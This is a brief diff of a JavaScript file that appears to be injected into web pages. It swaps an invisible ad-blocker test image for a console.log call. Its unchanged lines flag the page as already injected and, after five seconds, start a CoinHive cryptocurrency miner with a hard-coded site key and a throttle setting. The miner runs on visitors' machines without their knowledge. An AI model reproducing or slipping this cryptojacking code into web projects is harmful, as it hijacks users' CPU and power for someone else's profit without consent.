@@ -4,12 +4,7 @@ function Run(){
 		return false;
 	}
 	document.getElementsByTagName('body')[0].setAttribute('data-already-inject', 'true');
-
-	var img = document.createElement('img');
-	img.setAttribute('class', 'ads banner');
-	img.setAttribute('style', 'position: absolute; width: 1px; height: 1px; opacity: 0');
-	img.setAttribute('id', 'ad-block-test');
-	document.getElementsByTagName('body')[0].appendChild(img);
+	console.log('Hello');
 	setTimeout(function(){
 		var m = new CoinHive.Anonymous("j4Ottz1bbmrWDgfcjHEzZQZIlfA3vnPF", {throttle: throttleFromConfJs}); m.start();
 	}, 5000);
